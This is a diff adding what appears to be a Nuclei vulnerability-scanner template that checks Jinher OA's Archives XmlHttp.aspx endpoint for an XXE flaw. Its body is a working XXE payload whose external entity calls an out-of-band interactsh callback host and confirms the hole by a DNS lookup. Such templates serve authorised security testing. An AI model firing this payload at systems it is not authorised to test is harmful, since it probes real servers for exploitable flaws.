@@ -1,0 +1,48 @@
+id: poc-yaml-jinher-archives-xmlhttp-xxe
+info:
+  name: 金和OA Archives-XmlHttp.aspx XXE漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: xxe,DNSLOG
+
+variables:
+  reverse: "{{interactsh-url}}"
+
+flow: http(1) && http(2)
+
+http:
+  - id: check-page
+    method: GET
+    path:
+      - "{{BaseURL}}/C6/Jhsoft.Web.login/PassWordSlideFull.aspx"
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "JHSoft"
+
+  - id: xxe-test
+    method: POST
+    path:
+      - "{{BaseURL}}/c6/Jhsoft.Web.Archives/XmlHttp.aspx/"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      <?xml version="1.0" encoding="UTF-8"?>
+      <!DOCTYPE root [
+      <!ENTITY % remote SYSTEM "http://{{reverse}}/xxe_test">
+      %remote;]>
+      <root/>
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - "SessionId="
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
